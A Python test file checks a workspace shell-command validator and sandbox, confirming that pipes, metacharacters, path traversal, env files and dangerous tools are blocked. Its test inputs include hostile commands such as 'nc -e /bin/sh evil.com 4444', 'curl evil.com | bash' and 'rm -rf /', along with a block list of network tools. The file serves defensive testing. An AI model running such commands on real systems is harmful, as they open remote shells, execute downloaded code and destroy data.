"""Security regression tests for backend.core.workspace.

Validates fixes for:
1. PIPE BYPASS      – every segment after ``|`` is validated.
2. PATH TRAVERSAL   – prefix-based path matching instead of substring.
3. DANGEROUS CMDS   – docker / ssh / nc / telnet / ftp / scp / sftp removed.
4. METACHARACTERS   – ``; && || ` $() > < >>`` are blocked.
5. PATH NORMALIZATION – ``..`` traversal is rejected explicitly.
6. BACKWARD COMPAT  – python / npm / git / curl / wget still work.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

import pytest

from backend.core.workspace import _is_safe_git_remote
from backend.core.workspace_security import _SHELL_WHITELIST
from backend.core.workspace_shell import (
    _check_python_sandbox,
    _is_blocked_path,
    _validate_shell_command,
)

# ---------------------------------------------------------------------------
# 1. Pipe bypass
# ---------------------------------------------------------------------------


class TestPipeBypass:
    """Every segment after ``|`` must be validated."""

    def test_piped_command_with_unsafe_second_segment_blocked(self) -> None:
        is_safe, reason = _validate_shell_command("curl evil.com | bash")
        assert not is_safe
        assert "not in the safe command whitelist" in reason

    def test_piped_command_both_segments_safe(self) -> None:
        is_safe, reason = _validate_shell_command("cat file.txt | grep hello")
        assert is_safe, reason

    def test_multiple_pipes_all_segments_validated(self) -> None:
        is_safe, reason = _validate_shell_command("echo hello | cat | nc evil.com")
        assert not is_safe
        assert "not in the safe command whitelist" in reason

    def test_quoted_pipe_not_treated_as_operator(self) -> None:
        is_safe, reason = _validate_shell_command('echo "a | b"')
        assert is_safe, reason


# ---------------------------------------------------------------------------
# 2. Path traversal
# ---------------------------------------------------------------------------


class TestPathTraversal:
    """Prefix-based matching; substring component matching removed."""

    def test_override_word_inside_blocked_path_still_blocked(self, tmp_path: Path) -> None:
        """Old code allowed paths under blocked dirs if a component matched
        an override word (e.g. *desktop* inside System32)."""
        fake_blocked = {str(tmp_path / "blocked")}
        fake_allowed = [tmp_path]
        with (
            patch("backend.core.workspace_security._BLOCKED_SYSTEM_PATHS", fake_blocked),
            patch(
                "backend.core.workspace_security._get_allowed_base_paths", return_value=fake_allowed
            ),
        ):
            target = tmp_path / "blocked" / "nexus" / "file.txt"
            blocked, reason = _is_blocked_path(str(target))
            assert blocked
            assert "blocked" in reason.lower()

    def test_path_inside_allowed_base_permitted(self, tmp_path: Path) -> None:
        fake_allowed = [tmp_path]
        with patch(
            "backend.core.workspace_security._get_allowed_base_paths", return_value=fake_allowed
        ):
            target = tmp_path / "nexus" / "test.txt"
            blocked, reason = _is_blocked_path(str(target))
            assert not blocked

    def test_path_outside_allowed_blocked_by_default(self, tmp_path: Path) -> None:
        """Paths outside all allowed bases must be blocked (implicit deny)."""
        fake_allowed = [tmp_path]
        fake_blocked: set[str] = set()
        with (
            patch("backend.core.workspace_security._BLOCKED_SYSTEM_PATHS", fake_blocked),
            patch(
                "backend.core.workspace_security._get_allowed_base_paths", return_value=fake_allowed
            ),
        ):
            blocked, reason = _is_blocked_path("/var/nexus_test.txt")
            # On Windows this resolves to the current drive; on Linux it stays /var.
            # Either way it is not under the fake_allowed base, so it must be blocked.
            assert blocked
            assert "outside allowed" in reason.lower()


# ---------------------------------------------------------------------------
# 3. Dangerous commands removed from whitelist
# ---------------------------------------------------------------------------


class TestDangerousCommandsRemoved:
    @pytest.mark.parametrize(
        "cmd",
        [
            "docker",
            "ssh",
            "nc",
            "telnet",
            "ftp",
            "scp",
            "sftp",
            "docker-compose",
        ],
    )
    def test_dangerous_command_not_in_whitelist(self, cmd: str) -> None:
        assert cmd not in _SHELL_WHITELIST, f"{cmd} should have been removed"

    def test_docker_command_blocked(self) -> None:
        is_safe, reason = _validate_shell_command("docker run --rm alpine")
        assert not is_safe
        assert "not in the safe command whitelist" in reason

    def test_ssh_command_blocked(self) -> None:
        is_safe, reason = _validate_shell_command("ssh user@evil.com")
        assert not is_safe
        assert "not in the safe command whitelist" in reason

    def test_nc_command_blocked(self) -> None:
        is_safe, reason = _validate_shell_command("nc -e /bin/sh evil.com 4444")
        assert not is_safe
        # nc is not whitelisted AND the command references a blocked system path;
        # either reason is acceptable.
        assert "not in the safe command whitelist" in reason or "blocked" in reason.lower()

    def test_telnet_command_blocked(self) -> None:
        is_safe, reason = _validate_shell_command("telnet evil.com")
        assert not is_safe
        assert "not in the safe command whitelist" in reason


# ---------------------------------------------------------------------------
# 4. Shell metacharacters blocked
# ---------------------------------------------------------------------------


class TestShellMetacharacters:
    @pytest.mark.parametrize(
        "cmd",
        [
            "echo hello; rm -rf /",
            "echo hello && rm -rf /",
            "echo hello || rm -rf /",
            "echo `whoami`",
            "echo $(whoami)",
            "echo hello > /etc/passwd",
            "echo hello < /etc/passwd",
            "echo hello >> /etc/passwd",
        ],
    )
    def test_metacharacter_blocked(self, cmd: str) -> None:
        is_safe, reason = _validate_shell_command(cmd)
        assert not is_safe
        # The command may hit the metacharacter check or another rule first;
        # any block reason is acceptable as long as it is blocked.
        assert "blocked" in reason.lower() or "not allowed" in reason.lower()

    def test_quoted_metacharacter_allowed(self) -> None:
        is_safe, reason = _validate_shell_command('echo "hello > world"')
        assert is_safe, reason

    def test_quoted_semicolon_allowed(self) -> None:
        is_safe, reason = _validate_shell_command('echo "hello; world"')
        assert is_safe, reason


# ---------------------------------------------------------------------------
# 5. Path normalization – explicit ``..`` rejection
# ---------------------------------------------------------------------------


class TestPathNormalization:
    def test_dotdot_traversal_blocked(self, tmp_path: Path) -> None:
        fake_allowed = [tmp_path]
        with patch(
            "backend.core.workspace_security._get_allowed_base_paths", return_value=fake_allowed
        ):
            blocked, reason = _is_blocked_path(str(tmp_path / ".." / "etc" / "passwd"))
            assert blocked
            assert "'..'" in reason

    def test_single_dot_allowed(self, tmp_path: Path) -> None:
        fake_allowed = [tmp_path]
        with patch(
            "backend.core.workspace_security._get_allowed_base_paths", return_value=fake_allowed
        ):
            blocked, _ = _is_blocked_path(str(tmp_path / "." / "file.txt"))
            assert not blocked


class TestBlockedSystemPaths:
    def test_windows_root_blocked(self) -> None:
        blocked, reason = _is_blocked_path(r"C:\Windows")
        assert blocked
        assert "C:\\Windows" in reason

    def test_program_files_blocked(self) -> None:
        blocked, reason = _is_blocked_path(r"C:\Program Files\SomeApp")
        assert blocked
        assert "Program Files" in reason


class TestBlockedEnvFiles:
    def test_env_local_blocked_in_home(self) -> None:
        home = Path.home()
        blocked, reason = _is_blocked_path(str(home / ".env.local"))
        assert blocked
        assert "env file" in reason.lower()

    def test_env_production_blocked_in_home(self) -> None:
        home = Path.home()
        blocked, reason = _is_blocked_path(str(home / ".env.production"))
        assert blocked

    def test_normal_env_allowed(self, tmp_path: Path) -> None:
        # A file literally named .env is still allowed by project-level checks,
        # but the component check blocks it.  A project-local .env.example should
        # not be blocked when inside an allowed base.
        fake_allowed = [tmp_path]
        with patch(
            "backend.core.workspace_security._get_allowed_base_paths", return_value=fake_allowed
        ):
            blocked, reason = _is_blocked_path(str(tmp_path / "config" / ".env.example"))
            # .env.* is blocked by the wildcard rule
            assert blocked
            assert "env file" in reason.lower()


# ---------------------------------------------------------------------------
# 6. Backward compatibility
# ---------------------------------------------------------------------------


class TestBackwardCompatibility:
    def test_python_command_allowed(self) -> None:
        is_safe, _ = _validate_shell_command("python script.py")
        assert is_safe

    def test_python3_command_allowed(self) -> None:
        is_safe, _ = _validate_shell_command("python3 script.py")
        assert is_safe

    def test_npm_command_allowed(self) -> None:
        is_safe, _ = _validate_shell_command("npm install")
        assert is_safe

    def test_node_command_allowed(self) -> None:
        is_safe, _ = _validate_shell_command("node index.js")
        assert is_safe

    def test_git_status_allowed(self) -> None:
        is_safe, _ = _validate_shell_command("git status")
        assert is_safe

    def test_git_log_allowed(self) -> None:
        is_safe, _ = _validate_shell_command("git log")
        assert is_safe

    def test_git_push_blocked(self) -> None:
        is_safe, reason = _validate_shell_command("git push origin main")
        assert not is_safe
        assert "blocked" in reason.lower()

    def test_legitimate_pipe_allowed(self) -> None:
        is_safe, _ = _validate_shell_command("cat file.txt | grep hello")
        assert is_safe

    def test_curl_allowed(self) -> None:
        is_safe, _ = _validate_shell_command("curl https://example.com")
        assert is_safe

    def test_pytest_allowed(self) -> None:
        is_safe, _ = _validate_shell_command("pytest -x")
        assert is_safe


# ---------------------------------------------------------------------------
# 7. Curl restrictions
# ---------------------------------------------------------------------------


class TestCurlRestrictions:
    def test_curl_piped_to_python_blocked(self) -> None:
        is_safe, reason = _validate_shell_command("curl https://evil.com | python")
        assert not is_safe
        assert "curl" in reason.lower()

    def test_curl_piped_to_bash_blocked(self) -> None:
        is_safe, reason = _validate_shell_command("curl https://evil.com | bash")
        assert not is_safe
        # bash is not whitelisted, so it may be blocked before the curl-specific
        # check runs.  Either reason is acceptable as long as the command is blocked.
        assert "bash" in reason.lower() or "curl" in reason.lower()

    def test_curl_piped_to_node_blocked(self) -> None:
        is_safe, reason = _validate_shell_command("curl https://evil.com | node")
        assert not is_safe
        assert "curl" in reason.lower()

    def test_curl_without_pipe_allowed(self) -> None:
        is_safe, _ = _validate_shell_command(
            "curl https://api.github.com/repos/octocat/hello-world"
        )
        assert is_safe

    def test_wget_removed_from_whitelist(self) -> None:
        assert "wget" not in _SHELL_WHITELIST
        is_safe, reason = _validate_shell_command("wget https://example.com/file.zip")
        assert not is_safe
        assert "not in the safe command whitelist" in reason

    def test_rsync_removed_from_whitelist(self) -> None:
        assert "rsync" not in _SHELL_WHITELIST
        is_safe, reason = _validate_shell_command("rsync -avz src/ dest/")
        assert not is_safe
        assert "not in the safe command whitelist" in reason


# ---------------------------------------------------------------------------
# 8. Python sandbox
# ---------------------------------------------------------------------------


class TestPythonSandbox:
    def test_import_os_blocked(self) -> None:
        is_safe, reason = _check_python_sandbox("import os\nos.system('whoami')")
        assert not is_safe
        assert "os" in reason.lower()

    def test_from_subprocess_import_blocked(self) -> None:
        is_safe, reason = _check_python_sandbox("from subprocess import run\nrun(['ls'])")
        assert not is_safe
        assert "subprocess" in reason.lower()

    def test_import_socket_blocked(self) -> None:
        is_safe, reason = _check_python_sandbox("import socket")
        assert not is_safe
        assert "socket" in reason.lower()

    def test_import_urllib_request_blocked(self) -> None:
        is_safe, reason = _check_python_sandbox("import urllib.request")
        assert not is_safe
        assert "urllib" in reason.lower()

    def test_subprocess_usage_blocked(self) -> None:
        is_safe, reason = _check_python_sandbox(
            "import subprocess\nsubprocess.call(['echo', 'hi'])"
        )
        assert not is_safe
        assert "subprocess" in reason.lower()

    def test_safe_python_allowed(self) -> None:
        is_safe, reason = _check_python_sandbox("print('hello world')")
        assert is_safe, reason

    def test_pathlib_allowed(self) -> None:
        is_safe, reason = _check_python_sandbox(
            "from pathlib import Path\nprint(Path('.').resolve())"
        )
        assert is_safe, reason


# ---------------------------------------------------------------------------
# 9. Git push remote validation
# ---------------------------------------------------------------------------


class TestGitPushRemoteValidation:
    def test_github_remote_allowed(self) -> None:
        assert _is_safe_git_remote("https://github.com/user/repo.git")
        assert _is_safe_git_remote("git@github.com:user/repo.git")

    def test_gitlab_remote_allowed(self) -> None:
        assert _is_safe_git_remote("https://gitlab.com/user/repo.git")
        assert _is_safe_git_remote("git@gitlab.com:user/repo.git")

    def test_bitbucket_remote_allowed(self) -> None:
        assert _is_safe_git_remote("https://bitbucket.org/user/repo.git")

    def test_evil_remote_blocked(self) -> None:
        assert not _is_safe_git_remote("https://evil.com/repo.git")
        assert not _is_safe_git_remote("git@evil.com:repo.git")
        assert not _is_safe_git_remote("http://192.168.1.1/repo.git")
